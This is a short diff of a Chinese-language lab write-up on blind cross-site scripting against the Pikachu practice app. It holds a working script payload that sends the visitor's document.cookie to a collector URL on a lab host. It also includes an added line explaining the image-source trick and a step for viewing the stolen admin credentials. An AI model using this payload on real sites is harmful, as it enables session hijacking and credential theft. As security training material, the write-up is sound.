@@ -28,6 +28,8 @@ header("Location:http://172.16.120.252:8085/pikachu/index.php"); //重定向到�
 ```shell script
 <script>document.write('<img src="http://172.16.120.252:8085/pkxss/xcookie/cookie.php?cookie='+document.cookie+'"/>')</script>
 ```
+插入一个img标签进来，img的源是：http://172.16.120.252:8085/pkxss/xcookie/cookie.php?cookie=
+![image](https://github.com/498946975/Security/blob/master/images/xss_18.png)
 ### 3、提交成功之后，需要登陆网站后台进行查看，获取管理员后台的用户名和密码
 http://172.16.120.252:8085/vul/xss/xssblind/admin_login.php
 ![image](https://github.com/498946975/Security/blob/master/images/xss_11.png)
